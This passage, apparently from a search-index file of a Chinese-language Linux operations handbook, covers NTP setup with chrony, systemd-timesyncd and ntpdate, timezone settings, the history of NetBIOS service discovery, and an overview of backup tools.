\u200b\u670d\u52a1\u5668\u200b\u53ef\u4ee5\u200b\u907f\u514d\u200b\u5c40\u57df\u7f51\u200b\u5185\u200b\u7684\u200b\u8bbe\u5907\u200b\u5076\u5c14\u200b\u4ea7\u751f\u200b\u65f6\u95f4\u200b\u4e0d\u200b\u540c\u6b65\u200b\uff0c\u200b\u5e76\u200b\u51cf\u5c11\u200b\u5bf9\u200b\u516c\u7528\u200b NTP \u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u538b\u529b\u200b\u3002</p> <p>\u200b\u542f\u7528\u200b\u670d\u52a1\u7aef\u200b\u529f\u80fd\u200b\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b\u7f16\u8f91\u200b <code>/etc/chrony.conf</code> \u200b\u5141\u8bb8\u200b\u5b50\u7f51\u200b\u8bbf\u95ee\u200b\uff1a</p> <pre><code>allow 192.168/16\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u5728\u200b DHCP \u200b\u4e2d\u200b\u4e0b\u53d1\u200b NTP \u200b\u670d\u52a1\u5668\u200b\u914d\u7f6e\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5ba2\u6237\u7aef\u200b\u4e0d\u518d\u200b\u9700\u8981\u200b\u989d\u5916\u200b\u7684\u200b\u914d\u7f6e\u200b\u3002\u200b\u8fd9\u91cc\u200b\u4ee5\u200b\u5e38\u89c1\u200b\u7684\u200b DHCP \u200b\u670d\u52a1\u7aef\u200b\u8f6f\u4ef6\u200b dnsmasq \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u7f16\u8f91\u200b <code>/etc/dnsmasq.conf</code>\uff1a</p> <pre><code>dhcp-option=option:ntp-server,192.168.0.1\n</code></pre>"},{"location":"ops/network-service/ntp/#systemd-timesyncd","title":"systemd-timesyncd","text":"<p>systemd \u200b\u9879\u76ee\u200b\u4e5f\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u8f7b\u91cf\u7ea7\u200b\u7684\u200b\u65f6\u95f4\u200b\u540c\u6b65\u200b\u5ba2\u6237\u7aef\u200b\uff0c\u200b\u5373\u200b systemd-timesyncd\u3002\u200b\u8be5\u200b\u670d\u52a1\u200b\u53ef\u4ee5\u200b\u5728\u200b\u7cfb\u7edf\u200b\u8054\u7f51\u200b\u540e\u200b\u901a\u8fc7\u200b\u7b80\u5316\u200b\u7684\u200b SNTP \u200b\u534f\u8bae\u200b\u5b9a\u671f\u200b\u5411\u200b\u7f51\u7edc\u200b\u4e0a\u200b\u7684\u200b\u65f6\u95f4\u200b\u670d\u52a1\u5668\u200b\u8bf7\u6c42\u200b\u5f53\u524d\u200b\u65f6\u95f4\u200b\uff0c\u200b\u5e76\u200b\u81ea\u52a8\u200b\u6821\u51c6\u200b\u7cfb\u7edf\u200b\u65f6\u949f\u200b\u3002\u200b\u5982\u679c\u200b\u4f60\u200b\u53ea\u200b\u9700\u8981\u200b\u201c\u200b\u80fd\u200b\u540c\u6b65\u200b\u65f6\u95f4\u200b\u201d\uff0c\u200b\u5c24\u5176\u200b\u662f\u200b\u5f53\u200b\u6821\u56ed\u7f51\u200b\u6216\u200b\u4f01\u4e1a\u200b\u5185\u7f51\u200b\u4e2d\u200b\u5b58\u5728\u200b NTP \u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u65f6\u5019\u200b\uff0csystemd-timesyncd \u200b\u662f\u200b\u4e00\u4e2a\u200b\u66f4\u52a0\u200b\u7b80\u5355\u200b\u7701\u5fc3\u200b\u7684\u200b\u9009\u9879\u200b\u3002</p> <p>Debian \u200b\u81ea\u200b 12\uff08Bookworm\uff09\u200b\u7248\u672c\u200b\u8d77\u200b\u9009\u62e9\u200b systemd-timesyncd \u200b\u4f5c\u4e3a\u200b\u9ed8\u8ba4\u200b\u7684\u200b NTP \u200b\u5ba2\u6237\u7aef\u200b\uff0c\u200b\u56e0\u6b64\u200b\u901a\u5e38\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u4f60\u200b\u4e0d\u518d\u200b\u9700\u8981\u200b\u624b\u52a8\u200b\u5b89\u88c5\u200b\u5b83\u200b\uff08\u200b\u5373\u200b <code>apt install systemd-timesyncd</code>\uff09\u3002</p> <p>\u200b\u4f60\u200b\u53ef\u4ee5\u200b\u5728\u200b <code>/etc/systemd/timesyncd.conf</code> \u200b\u6587\u4ef6\u200b\u4e2d\u200b\u67e5\u770b\u200b\u53d1\u884c\u7248\u200b\u63d0\u4f9b\u200b\u7684\u200b\u9ed8\u8ba4\u200b\u65f6\u95f4\u200b\u670d\u52a1\u5668\u200b\u914d\u7f6e\u200b\u3002\u200b\u5982\u679c\u200b\u4f60\u200b\u60f3\u8981\u200b\u81ea\u5df1\u200b\u6307\u5b9a\u200b\u540c\u6b65\u200b\u7684\u200b\u65f6\u95f4\u200b\u670d\u52a1\u5668\u200b\uff0c\u200b\u53ef\u200b\u5728\u200b <code>/etc/systemd/timesyncd.conf.d/</code> \u200b\u76ee\u5f55\u200b\u4e0b\u200b\u65b0\u5efa\u200b\u4e00\u4e2a\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff08\u200b\u4f8b\u5982\u200b <code>custom.conf</code>\uff09\u3002\u200b\u6211\u4eec\u200b\u63a8\u8350\u200b\u5c3d\u53ef\u80fd\u200b\u4f7f\u7528\u200b\u4f4d\u4e8e\u200b\u6821\u56ed\u7f51\u200b\u6216\u200b\u4f01\u4e1a\u200b\u5185\u7f51\u200b\u7684\u200b\u65f6\u95f4\u200b\u6e90\u200b\uff0c\u200b\u4ee5\u200b\u51cf\u5c11\u200b\u7f51\u7edc\u200b\u5ef6\u8fdf\u200b\u5e76\u200b\u63d0\u5347\u200b\u540c\u6b65\u200b\u7a33\u5b9a\u6027\u200b\u3002\u200b\u4f8b\u5982\u200b\uff0c\u200b\u79d1\u5927\u200b\u6821\u56ed\u7f51\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e00\u4e2a\u200b Stratum 2 \u200b\u7684\u200b\u65f6\u95f4\u200b\u670d\u52a1\u5668\u200b <code>time.ustc.edu.cn</code>\uff0c\u200b\u4f60\u200b\u53ef\u4ee5\u200b\u5728\u200b <code>/etc/systemd/timesyncd.conf.d/custom.conf</code> \u200b\u4e2d\u200b\u6dfb\u52a0\u200b\u4ee5\u4e0b\u5185\u5bb9\u200b\u8ba9\u200b systemd-timesyncd \u200b\u4f7f\u7528\u200b\u5b83\u200b\uff1a</p> <pre><code>[Time]\nNTP=time.ustc.edu.cn\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\u67e5\u770b\u200b <code>systemd-timesyncd</code> \u200b\u7684\u200b\u540c\u6b65\u200b\u72b6\u6001\u200b\uff1a</p> <pre><code>timedatectl show-timesync\n</code></pre>"},{"location":"ops/network-service/ntp/#ntpdate","title":"ntpdate","text":"<p>ntpdate \u200b\u662f\u200b\u4e00\u4e2a\u200b\u4e00\u6b21\u6027\u200b\u7684\u200b\u65f6\u95f4\u200b\u540c\u6b65\u200b\u5de5\u5177\u200b\u3002\u200b\u5b83\u200b\u9002\u7528\u200b\u4e8e\u200b\u4e34\u65f6\u6027\u200b\u5730\u200b\u6821\u51c6\u200b\u7cfb\u7edf\u200b\u65f6\u949f\u200b\uff0c\u200b\u901a\u5e38\u200b\u7528\u4e8e\u200b\u5728\u200b\u7cfb\u7edf\u542f\u52a8\u200b\u65f6\u200b\u6216\u200b\u5728\u200b\u6ca1\u6709\u200b\u6301\u7eed\u200b\u8fd0\u884c\u200b\u7684\u200b NTP \u200b\u670d\u52a1\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u8fdb\u884c\u200b\u65f6\u95f4\u200b\u540c\u6b65\u200b\u3002</p> <p>\u200b\u4f60\u200b\u53ef\u4ee5\u200b\u5728\u200b Debian/Ubuntu \u200b\u7cfb\u7edf\u200b\u4e2d\u200b\u4f7f\u7528\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\u5b89\u88c5\u200b ntpdate\uff1a</p> <pre><code>apt install ntpdate\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\u67e5\u8be2\u200b\u67d0\u4e2a\u200b\u7279\u5b9a\u200b\u7684\u200b\u65f6\u95f4\u200b\u670d\u52a1\u5668\u200b\u7684\u200b Stratum \u200b\u5c42\u7ea7\u200b\u3001\u200b\u4e0e\u200b\u672c\u5730\u200b\u65f6\u949f\u200b\u7684\u200b\u504f\u5dee\u200b\u4ee5\u53ca\u200b\u7f51\u7edc\u200b\u5ef6\u8fdf\u200b\u7b49\u200b\u4fe1\u606f\u200b\uff1a</p> <pre><code>ntpdate -q time.ustc.edu.cn\n</code></pre> <p>\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u624b\u52a8\u200b\u540c\u6b65\u200b\u65f6\u95f4\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\uff1a</p> <pre><code>ntpdate -u time.ustc.edu.cn  \n</code></pre> <p>\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u7684\u200b\u662f\u200b\uff0cntpdate \u200b\u5e76\u200b\u4e0d\u662f\u200b\u4e00\u4e2a\u200b\u6301\u7eed\u200b\u8fd0\u884c\u200b\u7684\u200b\u670d\u52a1\u200b\uff0c\u200b\u53ea\u4f1a\u200b\u5728\u200b\u6bcf\u6b21\u200b\u6267\u884c\u200b\u65f6\u200b\u8fdb\u884c\u200b\u4e00\u6b21\u200b\u65f6\u95f4\u200b\u540c\u6b65\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5982\u679c\u200b\u4f60\u200b\u9700\u8981\u200b\u6301\u7eed\u200b\u7684\u200b\u65f6\u95f4\u200b\u540c\u6b65\u200b\u529f\u80fd\u200b\uff0c\u200b\u8fd8\u200b\u9700\u8981\u200b\u7ed3\u5408\u200b\u5176\u4ed6\u200b\u5de5\u5177\u200b\uff08\u200b\u5982\u200b cron\uff09\u200b\u6765\u200b\u5b9a\u671f\u200b\u6267\u884c\u200b ntpdate \u200b\u547d\u4ee4\u200b\u3002\u200b\u76f8\u6bd4\u4e4b\u4e0b\u200b\uff0c\u200b\u6211\u4eec\u200b\u63a8\u8350\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b systemd-timesyncd \u200b\u6216\u200b chrony \u200b\u6765\u200b\u5b9e\u73b0\u200b\u6301\u7eed\u200b\u7684\u200b\u65f6\u95f4\u200b\u540c\u6b65\u200b\u3002</p>"},{"location":"ops/network-service/ntp/#timezone","title":"\u8bbe\u7f6e\u200b\u65f6\u200b\u533a","text":"<p>\u200b\u5b8c\u6210\u200b\u65f6\u95f4\u200b\u540c\u6b65\u200b\u540e\u200b\uff0c\u200b\u4e3a\u200b\u786e\u4fdd\u200b\u672c\u5730\u200b\u65f6\u95f4\u200b\u663e\u793a\u200b\u6b63\u786e\u200b\uff0c\u200b\u8fd8\u200b\u9700\u8981\u200b\u8bbe\u7f6e\u200b\u7cfb\u7edf\u200b\u65f6\u200b\u533a\u200b\uff0c\u200b\u4f8b\u5982\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u4e2d\u56fd\u200b\u6807\u51c6\u200b\u65f6\u95f4\u200b\uff08\u200b\u4e1c\u516b\u533a\u200b\uff09\uff1a</p> <pre><code>timedatectl set-timezone Asia/Shanghai --adjust-system-clock\n</code></pre> <p>\u200b\u8bbe\u7f6e\u200b\u5b8c\u200b\u65f6\u95f4\u200b\u540c\u6b65\u200b\u670d\u52a1\u200b\u548c\u200b\u65f6\u533a\u200b\u540e\u200b\uff0c\u200b\u53ef\u200b\u4f7f\u7528\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\u68c0\u67e5\u200b\u7cfb\u7edf\u200b\u65f6\u95f4\u200b\u3001\u200b\u65f6\u200b\u533a\u200b\u3001\u200b\u4ee5\u53ca\u200b NTP \u200b\u670d\u52a1\u200b\u662f\u5426\u200b\u5df2\u200b\u542f\u7528\u200b\uff1a</p> <pre><code>timedatectl status\n</code></pre>"},{"location":"ops/network-service/zeroconf/","title":"Zeroconf","text":"<p>\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b</p> <p>@taoky</p> <p>\u200b\u672c\u6587\u200b\u7f16\u5199\u200b\u4e2d\u200b</p> <p>Zeroconf \u200b\u662f\u200b\u4e00\u5957\u200b\u5728\u200b\u5c40\u57df\u7f51\u200b\u4e2d\u200b\u8fdb\u884c\u200b\u81ea\u52a8\u200b\u7f51\u7edc\u200b\u914d\u7f6e\u200b\u7684\u200b\u65b9\u6848\u200b\uff0c\u200b\u5206\u4e3a\u200b\u4e09\u4e2a\u200b\u90e8\u5206\u200b\uff1a</p> <ul> <li>Link-local \u200b\u5730\u5740\u200b\u5206\u914d\u200b\uff1a\u200b\u5728\u200b\u6ca1\u6709\u200b DHCP \u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u8bbe\u5907\u200b\u53ef\u4ee5\u200b\u4e3a\u200b\u81ea\u5df1\u200b\u5206\u914d\u200b\u4e00\u4e2a\u200b link-local \u200b\u5730\u5740\u200b\u3002<ul> <li>\u200b\u4f46\u662f\u200b\u6b63\u5e38\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u4e0d\u4f1a\u200b\u6709\u4eba\u200b\u4f9d\u8d56\u4e8e\u200b\u8fd9\u4e2a\u200b\u7279\u6027\u200b\u7ec4\u7f51\u200b\u3002</li> </ul> </li> <li>\u200b\u540d\u79f0\u200b\u89e3\u6790\u200b\uff1a\u200b\u8bbe\u5907\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b mDNS \u200b\u534f\u8bae\u200b\u89e3\u6790\u200b\u5c40\u57df\u7f51\u200b\u5185\u90e8\u200b\u5176\u4ed6\u200b\u8bbe\u5907\u200b\u7684\u200b\u540d\u79f0\u200b\u3002</li> <li>\u200b\u670d\u52a1\u200b\u53d1\u73b0\u200b\uff1a\u200b\u8bbe\u5907\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b DNS-SD \u200b\u534f\u8bae\u200b\u53d1\u73b0\u200b\u5176\u4ed6\u200b\u8bbe\u5907\u200b\u63d0\u4f9b\u200b\u7684\u200b\u670d\u52a1\u200b\u3002</li> </ul> <p>\u200b\u4ee5\u4e0b\u200b\u4e3b\u8981\u200b\u4ecb\u7ecd\u200b\u4e0a\u9762\u200b\u4e09\u4e2a\u200b\u90e8\u5206\u200b\u7684\u200b\u9700\u6c42\u200b\u5bf9\u5e94\u200b\u7684\u200b\u5404\u7c7b\u200b\u534f\u8bae\u200b\uff0c\u200b\u5305\u62ec\u200b\u4f46\u200b\u4e0d\u200b\u9650\u4e8e\u200b mDNS \u200b\u4e0e\u200b DNS-SD\u3002</p>"},{"location":"ops/network-service/zeroconf/#link-local","title":"Link-local \u200b\u5730\u5740\u200b\u5206\u914d","text":""},{"location":"ops/network-service/zeroconf/#name-resolution","title":"\u540d\u79f0\u200b\u89e3\u6790","text":""},{"location":"ops/network-service/zeroconf/#service-discovery","title":"\u670d\u52a1\u200b\u53d1\u73b0","text":"<p>\u200b\u5982\u679c\u200b\u4f60\u200b\u4f7f\u7528\u200b\u8fc7\u8f83\u200b\u65e9\u671f\u200b\u7248\u672c\u200b\u7684\u200b Windows\uff0c\u200b\u90a3\u4e48\u200b\u4f60\u200b\u80af\u5b9a\u200b\u4f1a\u200b\u719f\u6089\u200b\u300c\u200b\u7f51\u4e0a\u90bb\u5c45\u200b\u300d\u200b\u8fd9\u4e2a\u200b\u529f\u80fd\u200b\u3002\u200b\u5728\u200b\u300c\u200b\u7f51\u4e0a\u90bb\u5c45\u200b\u300d\u200b\u91cc\u200b\uff0c\u200b\u4f60\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u5c40\u57df\u7f51\u200b\u5185\u200b\u5176\u4ed6\u200b\u8ba1\u7b97\u673a\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u5b83\u4eec\u200b\u5171\u4eab\u200b\u7684\u200b\u6587\u4ef6\u5939\u200b\u3001\u200b\u6253\u5370\u673a\u200b\u7b49\u200b\u8d44\u6e90\u200b\u3002\u200b\u65e9\u671f\u200b\u8fd9\u4e2a\u200b\u529f\u80fd\u200b\u4f9d\u8d56\u4e8e\u200b NetBIOS \u200b\u6765\u200b\u5b9e\u73b0\u200b\u3002</p> <p>NetBIOS</p> <p>NetBIOS\uff08\u200b\u4ee5\u4e0b\u200b\u5747\u200b\u6307\u4ee3\u200b NetBIOS over TCP/IP\uff09\u200b\u9700\u8981\u200b\u4e09\u79cd\u200b\u7aef\u53e3\u200b\uff1a</p> <ul> <li>\u200b\u547d\u540d\u200b\u4e0e\u200b\u89e3\u6790\u200b\uff08TCP 137 \u200b\u548c\u200b UDP 137\uff09\uff1aNetBIOS \u200b\u4f1a\u200b\u5e7f\u64ad\u200b\u4e3b\u673a\u540d\u200b\uff0c\u200b\u5e76\u200b\u786e\u5b9a\u200b\u662f\u5426\u200b\u5b58\u5728\u200b\u51b2\u7a81\u200b\u3002\u200b\u5176\u4ed6\u200b\u8ba1\u7b97\u673a\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u4e3b\u673a\u540d\u200b\u8fde\u63a5\u200b\u3002\u200b\u7531\u4e8e\u200b\u7b49\u5f85\u200b\u51b2\u7a81\u68c0\u6d4b\u200b\u4f1a\u200b\u82b1\u6389\u200b\u6bd4\u8f83\u200b\u957f\u200b\u7684\u200b\u65f6\u95f4\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4e4b\u540e\u200b\u6dfb\u52a0\u200b\u4e86\u200b WINS\uff08Windows Internet Name Service\uff09\u200b\u6765\u200b\u96c6\u4e2d\u7ba1\u7406\u200b\u4e3b\u673a\u540d\u200b\uff0cWindows \u200b\u5728\u200b\u67e5\u627e\u200b\u5230\u200b WINS \u200b\u670d\u52a1\u5668\u200b\u540e\u200b\u4f1a\u200b\u4f18\u5148\u200b\u4f7f\u7528\u200b WINS\u3002\u200b\u5c3d\u7ba1\u200b\u4e0d\u662f\u200b\u4ee5\u200b DNS \u200b\u7684\u200b\u5f62\u5f0f\u200b\u5b58\u5728\u200b\uff0c\u200b\u4f46\u662f\u200b Windows \u200b\u673a\u5668\u200b\u53ef\u4ee5\u200b\u4ee5\u6b64\u200b\u89e3\u6790\u200b\u4e3b\u673a\u540d\u200b\u5bf9\u5e94\u200b\u7684\u200b IP \u200b\u5730\u5740\u200b\u3002</li> <li>UDP 138\uff1a\u200b\u7528\u4e8e\u200b\u65e0\u200b session \u200b\u7684\u200b\u6d88\u606f\u4f20\u9012\u200b\u3002</li> <li>TCP 139\uff1a\u200b\u7528\u4e8e\u200b\u6709\u200b session \u200b\u7684\u200b\u6d88\u606f\u4f20\u9012\u200b\u3002</li> </ul> <p>NetBIOS \u200b\u4e0a\u9762\u200b\u53ef\u4ee5\u200b\u8fd0\u884c\u200b\u5e94\u7528\u200b\uff0c\u200b\u4f8b\u5982\u200b Browser \u200b\u670d\u52a1\u200b\u4e0e\u200b SMB \u200b\u670d\u52a1\u200b\u3002</p> <p>Browser \u200b\u670d\u52a1\u200b\u7ef4\u62a4\u200b\u4e86\u200b\u5c40\u57df\u7f51\u200b\u4e2d\u200b\u7684\u200b\u7f51\u7edc\u8d44\u6e90\u200b\u5217\u8868\u200b\uff08\u200b\u5c31\u662f\u200b\u4ee5\u524d\u200b\u300c\u200b\u7f51\u4e0a\u90bb\u5c45\u200b\u300d\u200b\u91cc\u9762\u200b\u4f60\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u7684\u200b\u5185\u5bb9\u200b\uff09\uff0c\u200b\u5c40\u57df\u7f51\u200b\u7684\u200b Windows \u200b\u673a\u5668\u200b\u4f1a\u200b\u6839\u636e\u200b Windows \u200b\u7248\u672c\u53f7\u200b\u3001\u200b\u7c7b\u578b\u200b\uff08\u200b\u662f\u200b\u684c\u9762\u200b\u8fd8\u662f\u200b\u670d\u52a1\u5668\u200b\u7cfb\u7edf\u200b\uff09\u200b\u7b49\u200b\u4fe1\u606f\u200b\u6765\u200b\u300c\u200b\u9009\u4e3e\u200b\u300d\u200b\u51fa\u200b\u4e00\u4e2a\u200b master browser\uff0c\u200b\u7531\u200b master browser \u200b\u7ef4\u62a4\u200b\u8fd9\u4e2a\u200b\u5217\u8868\u200b\u3002</p> <p>SMB \u200b\u670d\u52a1\u200b\u6700\u65e9\u200b\u4e5f\u200b\u4f9d\u8d56\u4e8e\u200b NetBIOS\u2014\u2014\u200b\u4e0d\u8fc7\u200b\uff0c\u200b\u4ece\u200b Windows 2000 \u200b\u5f00\u59cb\u200b\uff0cSMB \u200b\u5df2\u7ecf\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u5728\u200b TCP 445 \u200b\u7aef\u53e3\u200b\u4e0a\u200b\u8fd0\u884c\u200b\uff0c\u200b\u800c\u200b\u4e0d\u518d\u200b\u9700\u8981\u200b NetBIOS\u3002</p> <p>\u200b\u6b64\u5916\u200b\uff0c\u300c\u200b\u81ed\u540d\u662d\u8457\u200b\u300d\u200b\u7684\u200b Windows Messenger service \u200b\u4e5f\u200b\u662f\u200b\u57fa\u4e8e\u200b NetBIOS \u200b\u7684\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u670d\u52a1\u200b\u5141\u8bb8\u200b\u4f60\u200b\u7528\u200b <code>net send</code> \u200b\u547d\u4ee4\u200b\u5411\u200b\u7f51\u7edc\u200b\u4e0a\u200b\u5176\u4ed6\u200b\u8ba1\u7b97\u673a\u200b\u53d1\u9001\u200b\u6d88\u606f\u200b\uff0c\u200b\u6bd4\u5982\u8bf4\u200b\uff1a</p> <pre><code>net send somehost \"\u200b\u4f60\u200b\u7684\u200b\u7535\u8111\u200b\u88ab\u200b\u9ed1\u200b\u4e86\u200b\uff01\"\n</code></pre> <p>\u200b\u7136\u540e\u200b somehost \u200b\u4e0a\u9762\u200b\u5c31\u4f1a\u5f39\u200b\u51fa\u200b\u8fd9\u4e48\u200b\u4e00\u4e2a\u200b\u5bf9\u8bdd\u6846\u200b\u3002\u200b\u53ef\u80fd\u200b\u76f8\u6bd4\u200b\u4e8e\u200b\u6b63\u7ecf\u200b\u7528\u9014\u200b\u6765\u8bf4\u200b\uff0cMessenger \u200b\u670d\u52a1\u200b\u88ab\u200b\u62ff\u6765\u200b\u6574\u4eba\u200b\u548c\u200b\u5e72\u574f\u4e8b\u200b\u7684\u200b\u9891\u7387\u200b\u66f4\u9ad8\u200b\u4e00\u4e9b\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5728\u200b Windows XP SP2 \u200b\u540e\u200b\u9ed8\u8ba4\u200b\u88ab\u200b\u7981\u7528\u200b\uff0c\u200b\u4e14\u200b\u4e4b\u540e\u200b\u88ab\u200b\u5f7b\u5e95\u200b\u79fb\u200b\u9664\u4e86\u200b\u3002</p> <p>\u200b\u51fa\u4e8e\u200b\u5b89\u5168\u200b\u7b49\u200b\u8003\u8651\u200b\uff0c\u200b\u76ee\u524d\u200b\u9664\u975e\u200b\u9700\u8981\u200b\u517c\u5bb9\u200b\u8001\u200b\u8bbe\u5907\u200b\uff0c\u200b\u5426\u5219\u200b\u4e0d\u200b\u5efa\u8bae\u200b\u4f7f\u7528\u200b NetBIOS\u3002Windows 10 \u200b\u4e4b\u540e\u200b\u7684\u200b\u7248\u672c\u200b\u4e5f\u200b\u5df2\u7ecf\u200b\u4e0d\u518d\u200b\u9ed8\u8ba4\u200b\u542f\u7528\u200b NetBIOS\u3002</p> <p>\u200b\u76ee\u524d\u200b\u6700\u200b\u5e38\u89c1\u200b\u7684\u200b\u670d\u52a1\u200b\u81ea\u52a8\u200b\u53d1\u73b0\u200b\u534f\u8bae\u200b\u662f\u200b DNS-SD\uff1a\u200b\u5b83\u200b\u4f9d\u8d56\u200b mDNS \u200b\u8d1f\u8d23\u200b\u5c40\u57df\u7f51\u200b\u5185\u200b\u7684\u200b\u4e3b\u673a\u540d\u200b\u89e3\u6790\u200b\uff0c\u200b\u800c\u200b DNS-SD \u200b\u5219\u200b\u5728\u200b mDNS \u200b\u57fa\u7840\u200b\u4e0a\u200b\u8d1f\u8d23\u200b\u670d\u52a1\u200b\u53d1\u73b0\u200b\uff0c\u200b\u4f46\u662f\u200b Windows \u200b\u76ee\u524d\u200b\u5bf9\u6b64\u200b\u7684\u200b\u652f\u6301\u200b\u4e0d\u4f73\u200b\u3002Windows \u200b\u5219\u200b\u4f1a\u200b\u4f7f\u7528\u200b WS\u2011Discovery\uff08Web Services Dynamic Discovery\uff09\u200b\u6765\u200b\u53d1\u73b0\u200b\u5c40\u57df\u7f51\u200b\u4e2d\u200b\u7684\u200b\u670d\u52a1\u200b\u3002</p>"},{"location":"ops/storage/","title":"\u5b58\u50a8\u7cfb\u7edf","text":"<p>\u200b\u672c\u200b\u90e8\u5206\u200b\u4ecb\u7ecd\u200b\u7ef4\u62a4\u200b Linux \u200b\u670d\u52a1\u5668\u200b\u5b58\u50a8\u7cfb\u7edf\u200b\u7684\u200b\u6709\u5173\u200b\u5185\u5bb9\u200b\u3002</p>"},{"location":"ops/storage/backup/","title":"\u5907\u4efd\u200b\u4e0e\u200b\u6587\u4ef6\u4f20\u8f93\u200b\u5de5\u5177","text":"<p>\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b</p> <p>@taoky</p> <p>\u200b\u672c\u6587\u200b\u7f16\u5199\u200b\u4e2d\u200b</p>"},{"location":"ops/storage/backup/#intro","title":"\u7b80\u4ecb","text":"<p>\u200b\u5907\u4efd\u200b\u662f\u200b\u4fdd\u969c\u200b\u6570\u636e\u5b89\u5168\u200b\u7684\u200b\u91cd\u8981\u200b\u624b\u6bb5\u200b\u3002\u200b\u5728\u200b\u7406\u60f3\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u5907\u4efd\u200b\u5e94\u200b\u505a\u5230\u200b 3-2-1 \u200b\u539f\u5219\u200b\uff1a\u200b\u4e09\u4efd\u200b\u6587\u4ef6\u200b\u7684\u200b\u526f\u672c\u200b\uff0c\u200b\u5176\u4e2d\u200b\u4e24\u4efd\u200b\u5b58\u50a8\u200b\u5728\u200b\u4e0d\u540c\u200b\u7684\u200b\u8bbe\u5907\u200b\u4e0a\u200b\uff0c\u200b\u53e6\u200b\u4e00\u4efd\u200b\u8fdc\u7a0b\u200b\u5b58\u50a8\u200b\u3002</p> <p>\u200b\u4e00\u822c\u6765\u8bb2\u200b\uff0c\u200b\u7ba1\u7406\u5458\u200b\u9700\u8981\u200b\u8bbe\u7f6e\u200b\u5b9a\u65f6\u200b\u4efb\u52a1\u200b\uff08\u200b\u4f7f\u7528\u200b crontab \u200b\u6216\u8005\u200b systemd timer\uff09\uff0c\u200b\u5728\u200b\u4efb\u52a1\u200b\u4e2d\u200b\u8c03\u7528\u200b\u5907\u4efd\u200b\u6570\u636e\u200b\u7684\u200b\u547d\u4ee4\u200b\u6765\u200b\u5b9e\u73b0\u200b\u5907\u4efd\u200b\u3002\u200b\u5e38\u89c1\u200b\u7684\u200b\u65b9\u6cd5\u200b\u5305\u62ec\u200b\uff1a</p> <ul> <li>\u200b\u4f7f\u7528\u200b <code>tar</code> \u200b\u5f52\u6863\u200b\u6570\u636e\u200b\u76ee\u5f55\u200b\u3002</li> <li>\u200b\u4f7f\u7528\u200b <code>rsync</code> \u200b\u540c\u6b65\u200b\u6570\u636e\u200b\u76ee\u5f55\u200b\u3002</li> <li>\u200b\u4f7f\u7528\u200b\u6570\u636e\u5e93\u200b\u7684\u200b dump \u200b\u5de5\u5177\u200b\uff08\u200b\u4f8b\u5982\u200b <code>mysqldump</code>\uff09\u200b\u5907\u4efd\u200b\u6570\u636e\u5e93\u200b\u3002</li> <li>\u200b\u4f7f\u7528\u200b Btrfs\u3001ZFS \u200b\u6216\u200b LVM \u200b\u63d0\u4f9b\u200b\u7684\u200b\u5feb\u7167\u200b\u529f\u80fd\u200b\u3002Btrfs \u200b\u4e0e\u200b ZFS \u200b\u63d0\u4f9b\u200b\u4e86\u200b send/receive \u200b\u529f\u80fd\u200b\u4ee5\u4fbf\u200b\u7f51\u7edc\u200b\u4f20\u8f93\u200b\u3002</li> <li>\u200b\u4f7f\u7528\u200b <code>rclone</code> \u200b\u540c\u6b65\u200b\u5230\u200b\u4e91\u200b\u5b58\u50a8\u200b\uff08\u200b\u4f8b\u5982\u200b OneDrive\u3001S3 \u200b\u5bf9\u8c61\u200b\u5b58\u50a8\u200b\u7b49\u200b\uff09\u3002</li> <li>\u200b\u4f7f\u7528\u200b\u8bf8\u5982\u200b Duplicity\u3001BorgBackup \u200b\u7b49\u200b\u5907\u4efd\u200b\u5de5\u5177\u200b\u3002</li> <li>\u200b\u7279\u5b9a\u200b\u5e73\u53f0\u200b\u53ef\u80fd\u200b\u6709\u200b\u4e13\u7528\u200b\u7684\u200b\u5907\u4efd\u200b\u5de5\u5177\u200b\uff0c\u200b\u4f8b\u5982\u200b\u865a\u62df\u5316\u200b\u5e73\u53f0\u200b Proxmox VE \u200b\u7684\u200b Proxmox Backup Server\u3002</li> </ul> <p>\u200b\u5355\u7eaf\u200b\u7684\u200b\u5feb\u7167\u200b\u4e0e\u200b RAID \u200b\u90fd\u200b\u4e0d\u662f\u200b\u5907\u4efd\u200b</p> 